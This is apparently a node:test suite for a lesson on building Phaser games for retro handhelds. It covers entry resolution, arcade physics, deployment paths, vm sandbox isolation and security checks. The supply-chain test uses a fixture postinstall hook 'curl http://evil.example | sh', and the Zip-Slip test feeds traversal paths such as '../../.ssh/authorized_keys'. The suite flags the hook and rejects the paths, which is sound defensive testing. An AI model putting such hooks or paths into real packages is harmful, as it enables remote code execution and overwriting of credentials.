/**
 * Lesson 19.2 Automated Verification Suite (node --test)
 * Verifies:
 *  1. .jsg marker & package.json "type": "module" entry resolution
 *  2. Supply-chain --ignore-scripts & Zip-Slip path safety
 *  3. Browser sandbox boundary (vm realm isolation: no process/require/fs)
 *  4. Phaser-style 640x480 Arcade Physics bounce & world-bounds clamping
 *  5. Knulli / Batocera / ROCKNIX deployment path conventions
 */
import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import vm from 'node:vm';
import { fileURLToPath } from 'node:url';
import {
  stepArcadeBody,
  resolveJsgameEntry,
  auditPackageSupplyChain,
  validateArchivePaths,
  getRetroDeviceTargets,
} from './phaser-starter/src/utils.js';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const STARTER_DIR = path.join(__dirname, 'phaser-starter');

test('phaser-starter includes empty .jsg marker, ESM package.json, and valid main.js scene', () => {
  const markerPath = path.join(STARTER_DIR, 'phaser-demo.jsg');
  assert.equal(fs.existsSync(markerPath), true);
  assert.equal(fs.statSync(markerPath).size, 0);

  const pkg = JSON.parse(fs.readFileSync(path.join(STARTER_DIR, 'package.json'), 'utf8'));
  assert.equal(pkg.type, 'module');
  assert.equal(pkg.main, 'dist/phaser-demo.js');

  const resolved = resolveJsgameEntry(markerPath);
  assert.equal(resolved.source, 'src/main.js');
  assert.equal(resolved.entryFile, path.join(STARTER_DIR, 'src', 'main.js'));

  const mainSource = fs.readFileSync(resolved.entryFile, 'utf8');
  assert.match(mainSource, /extends Phaser\.Scene/);
  assert.match(mainSource, /setBounce\(1,\s*1\)/);
  assert.match(mainSource, /setCollideWorldBounds\(true\)/);
});

test('resolveJsgameEntry respects package.json#main when built dist bundle exists', () => {
  const pkgPath = path.join(STARTER_DIR, 'package.json');
  const rawPkg = JSON.parse(fs.readFileSync(pkgPath, 'utf8'));
  assert.equal(rawPkg.type, 'module');

  // Strict mode rejects missing configured main if preferFallback=false
  assert.throws(
    () => resolveJsgameEntry(STARTER_DIR, { preferFallback: false }),
    /Configured package\.json main entry not found/
  );
});

test('auditPackageSupplyChain flags install hooks and recommends --ignore-scripts', () => {
  const untrustedPkg = {
    name: 'sketchy-game',
    type: 'module',
    scripts: { postinstall: 'curl http://evil.example | sh' },
    dependencies: { phaser: '^3.90.0' },
  };
  const report = auditPackageSupplyChain(untrustedPkg);
  assert.equal(report.isEsm, true);
  assert.deepEqual(report.dangerousHooks, ['postinstall']);
  assert.equal(report.requiresIgnoreScripts, true);
  assert.equal(report.recommendedInstallCmd, 'npm install --ignore-scripts');
});

test('validateArchivePaths blocks Zip-Slip traversal attacks inside .jsgame archives', () => {
  const result = validateArchivePaths([
    'package.json',
    'phaser-demo.js',
    '../../.ssh/authorized_keys',
    '../evil.js',
  ]);
  assert.deepEqual(result.safe, ['package.json', 'phaser-demo.js']);
  assert.deepEqual(result.rejected, ['../../.ssh/authorized_keys', '../evil.js']);
});

test('jsgamelauncher browser sandbox excludes Node process, require, and fs globals', () => {
  const sandbox = vm.createContext({
    canvas: { width: 640, height: 480 },
    navigator: { getGamepads: () => [] },
    requestAnimationFrame: () => 1,
  });

  const probe = vm.runInContext(
    `JSON.stringify({
      hasCanvas: typeof canvas === 'object',
      hasNavigator: typeof navigator.getGamepads === 'function',
      processType: typeof process,
      requireType: typeof require,
      fsType: typeof fs,
      globalType: typeof global
    })`,
    sandbox
  );

  assert.deepEqual(JSON.parse(probe), {
    hasCanvas: true,
    hasNavigator: true,
    processType: 'undefined',
    requireType: 'undefined',
    fsType: 'undefined',
    globalType: 'undefined',
  });
});

test('stepArcadeBody enforces gravity, 640x480 world bounds, and bounce reversal', () => {
  const world = { width: 640, height: 480 };
  let body = {
    x: 610,
    y: 445,
    vx: 200,
    vy: 150,
    width: 40,
    height: 40,
    bounceX: 1,
    bounceY: 1,
    collideWorldBounds: true,
  };

  body = stepArcadeBody(body, world, 50, 200);
  assert.equal(body.x, 600); // clamped to 640 - 40
  assert.equal(body.y, 440); // clamped to 480 - 40
  assert.ok(body.vx < 0); // bounced off right edge
  assert.ok(body.vy < 0); // bounced off bottom edge
});

test('getRetroDeviceTargets returns Knulli, Batocera, and ROCKNIX paths with .jsg marker', () => {
  const targets = getRetroDeviceTargets('Space Blaster!');
  assert.equal(targets.markerFile, 'space-blaster-.jsg');
  assert.equal(targets.knulliPath, '/userdata/roms/jsgames/space-blaster-/space-blaster-.jsg');
  assert.equal(targets.batoceraPath, '/userdata/roms/jsgames/space-blaster-/space-blaster-.jsg');
  assert.equal(targets.rocknixPath, '/roms/jsgames/space-blaster-/space-blaster-.jsg');
});
